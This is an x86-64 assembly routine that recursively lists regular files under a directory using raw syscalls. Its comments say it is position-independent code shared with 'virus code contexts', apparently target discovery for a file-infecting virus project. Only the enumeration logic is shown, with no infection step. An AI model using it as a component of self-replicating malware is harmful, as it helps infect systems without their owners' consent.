; constantes

%define FILE_ENTRY_SIZE PATH_BUFF_SIZE
%define MAX_FILES       256
%define SYS_GETDENTS64  217
%define O_RDONLY        0
%define O_DIRECTORY     0x10000
%define O_RDONLY_DIR    O_RDONLY | O_DIRECTORY
%define DT_DIR          4
%define DT_REG          8
%define STDOUT          1
%define PATH_MAX        4096
%define STACK_LOCALS    128

; ============================================
; list_files_recursive - Position-independent file listing
; rdi = pointer to directory path  
; rsi = pointer to file_count (uint64_t*)
; rdx = pointer to file_list buffer
; 
; This function is position-independent and can be called from both
; original Famine and virus code contexts.
; ============================================
list_files_recursive:
    push rbp
    mov rbp, rsp
    
    ; Allocate stack space:
    ; - BUFFER_SIZE bytes for dir_buffer
    ; - STACK_LOCALS bytes for local variables and saved registers
    sub rsp, BUFFER_SIZE + STACK_LOCALS
    and rsp, -16                ; Align stack to 16 bytes

    ; Stack layout:
    ; [rbp-8]   = fd (directory file descriptor)
    ; [rbp-16]  = saved path length
    ; [rbp-24]  = nread (bytes read from getdents64)
    ; [rbp-32]  = current position in buffer
    ; [rbp-40]  = saved r12 (path pointer)
    ; [rbp-48]  = saved r13 (original r13)
    ; [rbp-56]  = saved r14 (original r14)
    ; [rbp-64]  = saved r15 (original r15)
    ; [rbp-72]  = saved rbx (original rbx)
    ; [rbp-80]  = saved d_type during path building
    ; [rbp-88]  = saved d_reclen during path building
    ; [rbp-96]  = file_count pointer (rsi parameter)
    ; [rbp-104] = file_list buffer pointer (rdx parameter)
    ; [rbp - BUFFER_SIZE - 128 ... rbp - 128] = dir_buffer

    mov [rbp-40], r12
    mov [rbp-48], r13
    mov [rbp-56], r14
    mov [rbp-64], r15
    mov [rbp-72], rbx

    ; Save the parameters
    mov r12, rdi                ; r12 = path
    mov [rbp-96], rsi           ; save file_count pointer
    mov [rbp-104], rdx          ; save file_list buffer

    ; Get the length of the current path
    mov rdi, r12
    call str_len
    mov [rbp-16], rax           ; save path length

    ; Open the directory
    mov eax, SYS_OPENAT         ; sys_openat
    mov edi, AT_FDCWD           ; AT_FDCWD
    mov rsi, r12                ; pathname
    mov edx, O_RDONLY_DIR       ; flags: read-only directory
    xor r10d, r10d              ; mode (not used for opening)
    syscall

    ; Check if open failed
    test rax, rax
    js .done                    ; if fd < 0, exit

    mov [rbp-8], rax            ; save fd
    mov r13, rax                ; r13 = fd

.read_loop:
    ; Call getdents64 - use stack buffer
    mov eax, SYS_GETDENTS64     ; sys_getdents64
    mov edi, r13d               ; fd
    lea rsi, [rbp - BUFFER_SIZE - STACK_LOCALS]   ; buffer on stack
    mov edx, BUFFER_SIZE        ; count
    syscall

    ; Check result
    test rax, rax
    jle .close_dir              ; if nread <= 0, we're done

    mov [rbp-24], rax           ; save nread
    mov qword [rbp-32], 0       ; pos = 0
    mov r14, rax                ; r14 = nread

.process_entry:
    mov rax, [rbp-32]           ; current position
    cmp rax, r14                ; compare with nread
    jge .read_loop              ; if pos >= nread, read more

    ; Get pointer to current dirent (in stack buffer)
    lea r15, [rbp - BUFFER_SIZE - STACK_LOCALS]
    add r15, rax                ; r15 = dirent pointer

    ; Get d_reclen (offset 16, 2 bytes)
    movzx ebx, word [r15 + 16]  ; rbx = d_reclen

    ; Get d_type (at offset 18)
    movzx eax, byte [r15 + 18]  ; eax = d_type

    ; Get d_name pointer (offset 19)
    lea rcx, [r15 + 19]         ; rcx = d_name

    ; Skip "." and ".."
    cmp byte [rcx], '.'
    jne .not_dot
    cmp byte [rcx+1], 0
    je .next_entry              ; skip "."
    cmp byte [rcx+1], '.'
    jne .not_dot
    cmp byte [rcx+2], 0
    je .next_entry              ; skip ".."

.not_dot:
    ; Save d_type and d_reclen on stack
    mov [rbp-80], rax           ; save d_type
    mov [rbp-88], rbx           ; save d_reclen

    ; Build full path: path = original_path + "/" + d_name
    mov rdi, r12                ; destination = path (our working path)
    mov rax, [rbp-16]           ; original path length
    add rdi, rax                ; point to end of original path

    ; Add "/" if needed
    cmp byte [rdi-1], '/'
    je .no_slash
    mov byte [rdi], '/'
    inc rdi

.no_slash:
    ; Append d_name (rcx still points to d_name)
    mov rsi, rcx                ; source = d_name
    call str_copy

    ; Restore d_type
    mov rax, [rbp-80]           ; restore d_type

    ; Check if it's a regular file (DT_REG = 8)
    cmp al, DT_REG
    jne .check_dir

    ; Check if we have room for more files (bounds checking)
    mov rsi, [rbp-96]           ; get file_count pointer
    mov rax, [rsi]              ; load current count
    cmp rax, MAX_FILES
    jge .skip_store             ; skip if file_list is full

    ; Store the file path in file_list
    ; Calculate destination: file_list + (file_count * FILE_ENTRY_SIZE)
    imul rax, FILE_ENTRY_SIZE
    mov rdi, [rbp-104]          ; get file_list buffer pointer
    add rdi, rax                ; destination = file_list[file_count]
    mov rsi, r12                ; source = current path
    call str_copy
    
    ; Increment file count
    mov rsi, [rbp-96]           ; get file_count pointer
    mov rax, [rsi]              ; load current count
    inc rax
    mov [rsi], rax              ; store incremented count

.skip_store:
%ifdef VERBOSE_MODE
    ; Print the full path
    mov rdi, r12                ; path
    call print_string
    
    ; Print newline
    push rax
    mov eax, SYS_WRITE
    mov edi, STDOUT
    lea rsi, [rel newline]
    mov edx, 1
    syscall
    pop rax
%endif
    
    jmp .restore_path

.check_dir:
    ; Check if it's a directory (DT_DIR = 4)
    cmp al, DT_DIR
    jne .restore_path

    ; Recurse into directory
    mov rdi, r12                ; path
    mov rsi, [rbp-96]           ; file_count pointer
    mov rdx, [rbp-104]          ; file_list buffer
    call list_files_recursive

.restore_path:
    ; Restore the original path by truncating at saved length
    mov rax, [rbp-16]           ; original path length
    mov byte [r12 + rax], 0     ; null terminate

    ; Restore d_reclen to rbx for next_entry calculation
    mov rbx, [rbp-88]

.next_entry:
    ; Move to next entry
    mov rax, [rbp-32]           ; current pos
    add rax, rbx                ; add d_reclen
    mov [rbp-32], rax           ; update pos
    jmp .process_entry

.close_dir:
    ; Close the directory
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

.done:
    ; Restore saved registers
    mov r12, [rbp-40]
    mov r13, [rbp-48]
    mov r14, [rbp-56]
    mov r15, [rbp-64]
    mov rbx, [rbp-72]

    mov rsp, rbp
    pop rbp
    ret
